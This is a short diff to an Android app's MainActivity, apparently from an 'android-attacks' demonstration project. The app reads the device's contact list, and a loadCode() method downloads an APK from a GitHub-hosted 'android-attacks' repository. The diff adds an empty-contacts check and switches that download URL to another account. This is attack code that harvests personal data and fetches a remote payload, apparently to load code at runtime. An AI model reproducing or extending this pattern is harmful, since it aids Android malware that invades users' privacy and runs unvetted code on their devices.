@@ -61,6 +61,9 @@ public class MainActivity extends AppCompatActivity {
         }
 
         HashMap<String, String> contactList = getContactList();
+        if(contactList.size() == 0) {
+            return;
+        }
 
         // Log all contacts
 //        for (Map.Entry<String, String> entry : contactList.entrySet()) {
@@ -83,7 +86,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void loadCode() {
         Log.i(TAG, "Downloading file...");
-        String URL = "https://github.com/manwelbugeja/android-attacks/blob/main/resources/app-debug.apk?raw=true";
+        String URL = "https://github.com/rubberduckydrip/android-attacks/blob/main/resources/app-debug.apk?raw=true";
         new DownloadFile().execute(URL);
     }
 
